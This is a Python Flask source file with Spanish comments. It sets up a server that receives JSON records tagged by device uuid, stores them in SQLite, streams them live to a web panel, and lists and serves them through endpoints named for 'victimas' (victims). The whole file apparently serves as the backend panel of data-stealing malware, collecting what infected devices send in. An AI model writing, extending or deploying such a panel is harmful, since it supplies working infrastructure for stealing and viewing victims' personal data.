from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO
import datetime
import json

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Modelo de datos
class Dato(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uuid = db.Column(db.String(100))
    tipo = db.Column(db.String(50))
    datos = db.Column(db.Text)  # Guardamos JSON stringificado
    timestamp = db.Column(db.DateTime, default=datetime.datetime.utcnow)

with app.app_context():
    db.create_all()

@app.route('/')
def index():
    # Renderiza la página del panel
    return render_template('index.html')

@app.route('/api/recibir', methods=['POST'])
def recibir():
    contenido = request.json
    nuevo = Dato(
        uuid=contenido.get('uuid'),
        tipo=contenido.get('tipo'),
        datos=json.dumps(contenido.get('datos')),  # Guardar JSON stringificado
    )
    db.session.add(nuevo)
    db.session.commit()

    # Emitir datos a clientes conectados por SocketIO
    socketio.emit('nuevo_dato', {
        'uuid': nuevo.uuid,
        'tipo': nuevo.tipo,
        'datos': contenido.get('datos'),  # Enviar objeto JSON sin stringificar
        'timestamp': nuevo.timestamp.isoformat()
    })
    return jsonify({"status": "ok"})

@app.route('/api/victimas')
def victimas():
    victimas = db.session.query(Dato.uuid).distinct().all()
    return jsonify([v[0] for v in victimas])

@app.route('/api/victima/<uuid>')
def datos_victima(uuid):
    datos = Dato.query.filter_by(uuid=uuid).order_by(Dato.timestamp.desc()).all()
    return jsonify([{
        'tipo': d.tipo,
        'datos': json.loads(d.datos),  # Convertimos string a JSON
        'timestamp': d.timestamp.isoformat()
    } for d in datos])

if __name__ == '__main__':
    socketio.run(app, host="0.0.0.0", port=5000)
